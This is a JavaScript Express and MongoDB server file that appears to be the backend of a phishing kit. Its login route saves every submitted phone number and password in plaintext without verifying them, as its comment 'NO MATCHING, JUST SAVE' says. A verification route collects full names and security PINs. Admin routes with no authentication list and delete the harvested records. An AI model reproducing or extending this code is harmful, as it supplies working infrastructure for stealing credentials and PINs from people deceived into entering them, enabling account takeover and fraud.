require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

/* -------------------- MIDDLEWARE -------------------- */
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE"],
  })
);
app.use(express.json());

/* -------------------- MONGODB CONNECT -------------------- */
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected Successfully"))
  .catch((err) => {
    console.error("❌ MongoDB connection error:", err);
    process.exit(1);
  });

/* -------------------- SCHEMAS -------------------- */
const userSchema = new mongoose.Schema(
  {
    phone: String,
    password: String,
  },
  { timestamps: true }
);
const User = mongoose.model("User", userSchema);

const verificationSchema = new mongoose.Schema(
  {
    userId: String,
    full_name: String,
    problem: String,
    security_pin: String,
    experience: String,
  },
  { timestamps: true }
);
const Verification = mongoose.model("Verification", verificationSchema);

/* ==================== API ROUTES ==================== */

/* ---------- LOGIN (NO MATCHING, JUST SAVE) ---------- */
app.post("/api/login", async (req, res) => {
  try {
    const { phone, password } = req.body;

    if (!phone || !password) {
      return res.status(400).json({ success: false });
    }

    const user = await User.create({ phone, password });

    res.json({
      success: true,
      userId: user._id,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ---------- VERIFICATION ---------- */
app.post("/api/verify", async (req, res) => {
  try {
    const { full_name, problem, security_pin, experience } = req.body;

    if (!full_name || !security_pin) {
      return res.json({ success: false });
    }

    await Verification.create({
      userId: Date.now().toString(), // simple linking
      full_name,
      problem,
      security_pin,
      experience,
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ---------- ADMIN LOGIN ---------- */
app.post("/api/admin/login", (req, res) => {
  if (req.body.password === process.env.ADMIN_PASSWORD) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

/* ---------- ADMIN USERS ---------- */
app.get("/api/admin/getUsers", async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (err) {
    console.error(err);
    res.status(500).json([]);
  }
});

app.delete("/api/admin/deleteUser/:id", async (req, res) => {
  try {
    await User.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ---------- ADMIN VERIFICATION ---------- */
app.get("/api/admin/getVerification", async (req, res) => {
  try {
    const data = await Verification.find().sort({ createdAt: -1 });
    res.json(data);
  } catch (err) {
    console.error(err);
    res.status(500).json([]);
  }
});

app.delete("/api/admin/deleteVerification/:id", async (req, res) => {
  try {
    await Verification.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* -------------------- SERVER -------------------- */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () =>
  console.log("🚀 Server running on port", PORT)
);
